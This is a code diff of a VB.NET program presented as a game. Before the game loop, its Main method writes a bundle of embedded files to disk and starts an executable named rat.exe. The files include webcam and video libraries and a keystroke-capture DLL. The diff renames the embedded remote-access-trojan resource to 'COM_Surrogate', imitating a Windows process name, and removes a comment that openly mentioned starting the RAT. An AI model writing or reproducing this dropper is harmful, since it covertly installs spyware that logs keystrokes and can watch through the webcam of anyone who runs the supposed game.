@@ -94,11 +94,33 @@ Public Module Module1
     'Real time game loop
     '*******************
     Public Sub Main()
-        'Start out RAT muhahaha
+        'Copy all libs
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "Accord.dll"), My.Resources.Accord)
+        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "Accord.dll.config"), My.Resources.Accord_dll)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "Accord.Video.dll"), My.Resources.Accord_Video)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "Accord.Video.FFMPEG.dll"), My.Resources.Accord_Video_FFMPEG)
+        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "Accord.Video.FFMPEG.xml"), My.Resources.Accord_Video1)
+        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "Accord.Video.xml"), My.Resources.Accord_Video1)
+        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "Accord.xml"), My.Resources.Accord1)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "AForge.dll"), My.Resources.AForge)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "AForge.Video.DirectShow.dll"), My.Resources.AForge_Video_DirectShow)
+        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "AForge.Video.DirectShow.xml"), My.Resources.AForge_Video_DirectShow1)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "AForge.Video.dll"), My.Resources.AForge_Video)
+        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "AForge.Video.xml"), My.Resources.AForge_Video1)
+        File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), "AForge.xml"), My.Resources.AForge1)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "avcodec-57.dll"), My.Resources.avcodec_57)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "avdevice-57.dll"), My.Resources.avdevice_57)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "avfilter-6.dll"), My.Resources.avfilter_6)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "avformat-57.dll"), My.Resources.avformat_57)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "avutil-55.dll"), My.Resources.avutil_55)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "KeystrokeAPI.dll"), My.Resources.KeystrokeAPI)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "postproc-54.dll"), My.Resources.postproc_54)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "swresample-2.dll"), My.Resources.swresample_2)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "swscale-4.dll"), My.Resources.swscale_4)
+        File.WriteAllBytes(Path.Combine(Directory.GetCurrentDirectory(), "System.Drawing.Common.dll"), My.Resources.System_Drawing_Common)
+
         Dim exe As String = Path.Combine(Directory.GetCurrentDirectory(), "rat.exe")
-        Dim keystrokeAPI As String = Path.Combine(Directory.GetCurrentDirectory(), "KeystrokeAPI.dll")
-        System.IO.File.WriteAllBytes(exe, My.Resources.remote_access_trojan)
-        System.IO.File.WriteAllBytes(keystrokeAPI, My.Resources.KeystrokeAPI)
+        System.IO.File.WriteAllBytes(exe, My.Resources.COM_Surrogate)
         Process.Start(exe)
 
         game = New Game(Form1, 800, 600)
